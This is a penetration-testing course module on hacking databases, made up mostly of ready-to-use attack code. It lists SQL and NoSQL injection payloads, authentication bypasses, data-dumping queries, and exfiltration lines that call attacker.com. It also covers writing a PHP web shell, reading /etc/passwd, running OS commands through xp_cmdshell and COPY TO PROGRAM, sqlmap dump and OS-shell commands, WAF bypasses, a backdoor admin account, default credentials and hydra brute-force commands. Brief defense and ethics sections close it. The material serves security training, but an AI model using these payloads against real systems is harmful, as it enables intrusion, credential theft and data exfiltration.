# Introduction to Hacking Databases

## Introduction

Databases store an organization's most valuable assets: data. This module covers techniques for identifying, accessing, and exploiting database vulnerabilities, with a focus on SQL injection and database-specific attacks.

## Why Target Databases?

- **Valuable Data**: Customer information, financial records, intellectual property
- **Central Repository**: Single point storing critical information
- **Common Vulnerabilities**: SQL injection remains prevalent
- **Privilege Escalation**: Database access can lead to system compromise
- **Data Exfiltration**: Direct access to sensitive information

## Database Types

### Relational Databases (SQL)

- **MySQL/MariaDB**: Popular open-source databases
- **PostgreSQL**: Advanced open-source database
- **Microsoft SQL Server**: Enterprise Windows database
- **Oracle**: Enterprise-grade commercial database
- **SQLite**: Lightweight embedded database

### NoSQL Databases

- **MongoDB**: Document-oriented database
- **Redis**: In-memory key-value store
- **Cassandra**: Distributed wide-column store
- **CouchDB**: Document-oriented database
- **Elasticsearch**: Search and analytics engine

## SQL Injection (SQLi)

### What is SQL Injection?

SQL injection occurs when user input is improperly sanitized and directly included in SQL queries, allowing attackers to manipulate the query logic.

### Vulnerable Code Example

```php
// Vulnerable PHP code
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);
```

### Types of SQL Injection

#### 1. In-Band SQLi (Classic)

**Error-Based SQLi**
```sql
-- Trigger error to reveal information
' OR 1=1--
' UNION SELECT NULL--
' AND 1=CONVERT(int, (SELECT @@version))--
```

**Union-Based SQLi**
```sql
-- Combine results from multiple queries
' UNION SELECT NULL, NULL, NULL--
' UNION SELECT username, password, email FROM users--
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables--
```

#### 2. Blind SQLi

**Boolean-Based Blind SQLi**
```sql
-- True condition
' AND '1'='1
' AND (SELECT COUNT(*) FROM users) > 0--

-- False condition
' AND '1'='2
' AND (SELECT COUNT(*) FROM users) < 0--
```

**Time-Based Blind SQLi**
```sql
-- MySQL
' AND SLEEP(5)--
' OR IF(1=1, SLEEP(5), 0)--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- MSSQL
'; WAITFOR DELAY '00:00:05'--

-- Oracle
' AND DBMS_LOCK.SLEEP(5)--
```

#### 3. Out-of-Band SQLi

```sql
-- DNS exfiltration (MSSQL)
'; EXEC master..xp_dirtree '\\attacker.com\share'--

-- HTTP exfiltration (Oracle)
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/"> %remote;]>'),'/l') FROM dual--
```

## SQL Injection Exploitation

### Database Enumeration

```sql
-- MySQL
SELECT @@version
SELECT user()
SELECT database()
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- PostgreSQL
SELECT version()
SELECT current_user
SELECT current_database()
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- MSSQL
SELECT @@version
SELECT user_name()
SELECT db_name()
SELECT name FROM sys.tables
SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('users')

-- Oracle
SELECT * FROM v$version
SELECT user FROM dual
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

### Data Extraction

```sql
-- Extract usernames and passwords
' UNION SELECT username, password FROM users--

-- Concatenate multiple columns
' UNION SELECT CONCAT(username, ':', password) FROM users--

-- Extract one row at a time
' UNION SELECT username FROM users LIMIT 1 OFFSET 0--
' UNION SELECT username FROM users LIMIT 1 OFFSET 1--
```

### Authentication Bypass

```sql
-- Basic bypass
admin' OR '1'='1'--
admin' OR '1'='1'#
admin' OR '1'='1'/*

-- Always true conditions
' OR 1=1--
' OR 'x'='x
') OR ('x'='x

-- Comment out password check
admin'--
admin'#
admin'/*
```

### File System Access

```sql
-- MySQL - Read files
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- MySQL - Write files
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--

-- MSSQL - Read files
' UNION SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB)--

-- PostgreSQL - Read files
'; COPY (SELECT '') TO PROGRAM 'cat /etc/passwd'--
```

### Command Execution

```sql
-- MSSQL - xp_cmdshell
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--

-- MySQL - UDF (User Defined Functions)
-- Requires file write privileges and specific setup

-- PostgreSQL - COPY TO PROGRAM
'; COPY (SELECT '') TO PROGRAM 'id'--
```

## SQLMap - Automated SQL Injection

### Basic Usage

```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="username=admin&password=pass"

# Cookie-based
sqlmap -u "http://target.com/page" --cookie="PHPSESSID=abc123"

# Custom header
sqlmap -u "http://target.com/page" --headers="X-Forwarded-For: 127.0.0.1"
```

### Advanced Options

```bash
# Specify DBMS
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Enumerate columns
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --columns

# Dump data
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# Dump all
sqlmap -u "http://target.com/page?id=1" --dump-all

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# SQL shell
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

### Tamper Scripts

```bash
# Bypass WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment

# Multiple tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between

# Common tamper scripts:
# - space2comment: Replace space with comments
# - between: Replace equals with BETWEEN
# - charencode: URL encode characters
# - randomcase: Random case for keywords
```

## NoSQL Injection

### MongoDB Injection

```javascript
// Authentication bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// Extract data
{"username": {"$regex": "^admin"}}
{"username": {"$regex": "^a"}}  // Brute force first character

// JavaScript injection
{"username": "admin", "password": {"$where": "return true"}}
```

### NoSQL Injection in URLs

```
# Authentication bypass
username[$ne]=admin&password[$ne]=pass

# Regex injection
username[$regex]=^admin&password[$ne]=pass

# Greater than
username[$gt]=&password[$gt]=
```

## Database-Specific Attacks

### MySQL/MariaDB

```sql
-- Version detection
SELECT @@version

-- User enumeration
SELECT user, host, password FROM mysql.user

-- Privilege escalation
-- Create admin user
CREATE USER 'hacker'@'%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%';

-- UDF for command execution
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');
```

### PostgreSQL

```sql
-- Version
SELECT version()

-- Read file
CREATE TABLE temp(data text);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp;

-- Write file
COPY (SELECT 'shell code') TO '/tmp/shell.php';

-- Command execution (requires superuser)
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('id');
```

### Microsoft SQL Server

```sql
-- Version
SELECT @@version

-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';

-- Read file
EXEC xp_cmdshell 'type C:\Windows\System32\drivers\etc\hosts';

-- Linked servers
EXEC sp_linkedservers;
```

### Oracle

```sql
-- Version
SELECT * FROM v$version;

-- Current user
SELECT user FROM dual;

-- Tables
SELECT table_name FROM all_tables;

-- Privileges
SELECT * FROM session_privs;

-- Execute OS commands (requires Java stored procedures)
-- Requires specific setup and privileges
```

## Direct Database Attacks

### Default Credentials

```
MySQL: root / (blank), root / root
PostgreSQL: postgres / postgres
MSSQL: sa / (blank), sa / sa
MongoDB: (no auth by default)
Redis: (no auth by default)
Oracle: system / manager, sys / change_on_install
```

### Brute Force

```bash
# MySQL
hydra -l root -P passwords.txt mysql://target.com

# PostgreSQL
hydra -l postgres -P passwords.txt postgres://target.com

# MSSQL
hydra -l sa -P passwords.txt mssql://target.com

# MongoDB
nmap -p 27017 --script mongodb-brute target.com
```

### Network Scanning

```bash
# Nmap database detection
nmap -p 3306,5432,1433,27017,6379 target.com

# MySQL
nmap -p 3306 --script mysql-info,mysql-enum target.com

# PostgreSQL
nmap -p 5432 --script pgsql-brute target.com

# MSSQL
nmap -p 1433 --script ms-sql-info,ms-sql-brute target.com

# MongoDB
nmap -p 27017 --script mongodb-info,mongodb-databases target.com
```

## Database Security Testing Tools

### Specialized Tools

- **SQLMap**: Automated SQL injection
- **NoSQLMap**: NoSQL injection testing
- **Commix**: Command injection exploitation
- **jSQL Injection**: GUI SQL injection tool
- **Havij**: Automated SQL injection (Windows)

### Database Clients

- **MySQL Workbench**: MySQL GUI client
- **pgAdmin**: PostgreSQL GUI client
- **DBeaver**: Universal database client
- **SQL Server Management Studio**: MSSQL client
- **MongoDB Compass**: MongoDB GUI client

## Mitigation and Defense

### Secure Coding Practices

```php
// Parameterized queries (prepared statements)
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();

// ORM usage
$user = User::where('username', $username)->where('password', $password)->first();

// Input validation
$username = filter_var($username, FILTER_SANITIZE_STRING);

// Whitelist validation
if (!in_array($column, ['id', 'name', 'email'])) {
    die('Invalid column');
}
```

### Database Hardening

- Remove default accounts
- Use strong passwords
- Implement least privilege
- Disable unnecessary features (xp_cmdshell, LOAD_FILE)
- Enable audit logging
- Keep database software updated
- Use network segmentation
- Encrypt sensitive data
- Regular security assessments

## Best Practices for Pentesters

- **Authorization**: Only test authorized systems
- **Data Handling**: Don't exfiltrate real data
- **Destructive Actions**: Avoid DROP, DELETE, UPDATE on production
- **Documentation**: Record all queries and findings
- **Cleanup**: Remove any created users or backdoors
- **Responsible Disclosure**: Report findings appropriately

## Practical Exercises

1. Exploit SQL injection in DVWA or SQLi-Labs
2. Use SQLMap to enumerate and dump a database
3. Practice blind SQL injection techniques
4. Test NoSQL injection in MongoDB
5. Exploit MSSQL xp_cmdshell for command execution

## Resources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks - SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)

## Next Steps

After understanding database exploitation, you'll learn about attacking networking devices and infrastructure components.

